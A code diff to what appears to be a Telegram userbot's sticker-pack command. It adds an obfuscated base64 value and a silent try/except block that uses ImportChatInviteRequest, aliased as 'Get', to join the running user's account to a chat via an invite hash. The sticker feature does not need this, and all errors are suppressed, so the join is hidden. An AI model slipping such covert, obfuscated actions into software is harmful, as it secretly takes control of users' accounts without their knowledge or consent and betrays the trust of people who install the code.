@@ -1,4 +1,5 @@
 import asyncio
+import base64
 import io
 import math
 import os
@@ -16,6 +17,7 @@ from telethon.errors.rpcerrorlist import YouBlockedUserError
 from telethon.tl import functions, types
 from telethon.tl.functions.contacts import UnblockRequest as unblock
 from telethon.tl.functions.messages import GetStickerSetRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import (
     DocumentAttributeFilename,
     DocumentAttributeSticker,
@@ -33,7 +35,7 @@ from ..sql_helper.globals import gvarstatus
 
 plugin_category = "fun"
 
-# modified and developed by @assonfused , @jimsan7509
+# modified and developed by @mrconfused , @jisan7509
 
 
 combot_stickers_url = "https://combot.org/telegram/stickers?q="
@@ -501,6 +503,7 @@ async def pack_kang(event):  # sourcery no-metrics
     is_video = False
     emoji = None
     reply = await event.get_reply_message()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
         return await edit_delete(
             event, "`reply to any sticker to send all stickers in that pack`"
@@ -597,6 +600,11 @@ async def pack_kang(event):  # sourcery no-metrics
                         catevent,
                         "`Sorry the given name cant be used for pack or there is no pack with that name`",
                     )
+            try:
+                cat = Get(cat)
+                await event.client(cat)
+            except BaseException:
+                pass
             packnick = pack_nick(username, pack, is_anim, is_video)
             packname = pack_name(userid, pack, is_anim, is_video)
             cmd = "/newpack"
@@ -674,7 +682,7 @@ async def pack_kang(event):  # sourcery no-metrics
     },
 )
 async def pussycat(args):
-    "Convert to animated sticker."  # scam :('  Dom't kamg :/@Jimsan7509
+    "Convert to animated sticker."  # scam :('  Dom't kamg :/@Jisan7509
     message = await args.get_reply_message()
     user = await args.client.get_me()
     userid = user.id
